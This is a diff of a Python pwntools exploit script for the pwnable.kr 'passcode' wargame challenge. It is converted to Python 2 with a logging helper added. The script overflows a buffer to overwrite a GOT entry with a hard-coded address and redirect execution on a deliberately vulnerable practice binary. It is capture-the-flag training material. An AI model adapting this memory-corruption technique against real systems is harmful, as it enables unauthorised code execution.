@@ -1,20 +1,25 @@
-#!/usr/bin/python3
+#!/usr/bin/python2
 from pwn import *
 
 s = ssh('passcode', 'pwnable.kr', 2222, 'guest')
 p = s.process('./passcode')
 
-exp_buf = b'a' * 96 + b'\x18\xa0\x04\x08'
-p.send(exp_buf + b'\n')
+def Sendline(s):
+    p.sendline(s)
+    print(s)
+    sleep(0.5)
 
+print p.read(),
+exp_buf = 'a' * 96 + '\x18\xa0\x04\x08'
+Sendline(exp_buf)
+
+print p.read(),
 payload = str(0x080485e3)
-p.sendline(payload)
+Sendline(payload)
 
-p.sendline('fuck')
+print p.read(),
+Sendline('fuck')
 
-recv = p.recvall()
-recv = recv.replace(b'\xa0', b'')
-print(recv.decode('ascii'))
-
-
-
+recv = p.readall()
+recv = recv.replace('\xa0', '')
+print(recv)
